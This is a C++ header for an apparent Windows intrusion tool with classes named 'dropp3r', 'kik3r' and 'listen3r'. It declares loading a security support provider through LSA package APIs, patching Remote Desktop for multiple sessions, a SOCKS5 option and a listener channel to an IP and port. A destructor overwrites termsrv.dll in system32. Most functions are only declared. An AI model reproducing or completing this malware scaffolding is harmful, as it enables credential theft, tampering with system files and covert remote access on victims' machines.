#pragma once

#define WIN32_NO_STATUS
#define SECURITY_WIN32
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#include <stdio.h>
#include <filesystem>
#include <iostream>
#include <fstream> 
#include <regex> // for parsing args
#include <string>
#pragma comment(lib, "Secur32.lib")

using namespace std::string_literals;
namespace fs = std::filesystem;

std::string PATH{ "c:\\temp\\" };

#define NO_CREATE_FOLDER -1;
#define NO_CREATE_FILE -2;
#define ERR_NOT_FOUND -3;
#define RESOURCE_NOT_LOAD -4;
#define NO_PATCH_MULTIRDP -10;
#define ERR_OWNER_CHANGE -11;
#define FAIL -999;

#define PIP_NAME "\\\\.\\pipe\\communicate"

const std::regex IPv4_PATTERN(
	R"(^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$)"
);

const std::regex PORT_PATTERN(
	R"(^(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3}|0)$)"
);

struct AppConfig {
	bool isSocks5 = false;
	bool isKoH = false;
	bool isPatch = false;
	std::string IP;
	std::string PORT;
	std::string username{};
}Args;


AppConfig parseArguments(int argc, char* argv[]);

class dropp3r;
class kik3r;


class dropp3r {
public:
	dropp3r() = default;
	int createTempDirectory();
	int dropRelations();
	int loadProvider();
};


class kik3r {
public:

	kik3r() = default;
	int patchMultiRDP();
	int kick_off();
	~kik3r() {
		fs::copy_file(PATH + "termsrv.dll", "c:\\windows\\system32");
	}
};

class listen3r {
public:
	listen3r() = default;
	int buildChannel(std::string IP, std::string PORT);
};
